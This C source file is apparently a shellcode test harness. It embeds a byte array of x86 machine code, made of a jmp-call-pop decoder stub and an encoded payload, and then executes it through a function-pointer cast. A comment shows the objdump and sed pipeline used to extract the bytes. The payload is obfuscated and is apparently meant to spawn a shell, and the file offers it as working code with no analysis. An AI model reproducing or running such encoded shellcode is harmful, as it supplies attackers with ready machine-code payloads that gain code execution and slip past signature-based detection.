#include<stdio.h>
#include<string.h>

/* objdump -d ./Slumberry.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' */

unsigned char code[] = \
"\xeb\x15\x5e\x31\xc9\xb1\x19\x8a\x06\xc6\x06\x90\x46\x30\x06\xf6\x16\x28\x06\xe2\xf7\xeb\x05\xe8\xe6\xff\xff\xff\xe4\x0e\xbf\x2f\x57\x08\x08\x4c\x57\x57\x08\x5d\x56\x49\x76\xdc\x2f\x76\xdd\x2c\x76\xde\x8f\xf4\xaa\x7f";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;
	ret();

	return 0;

}

	
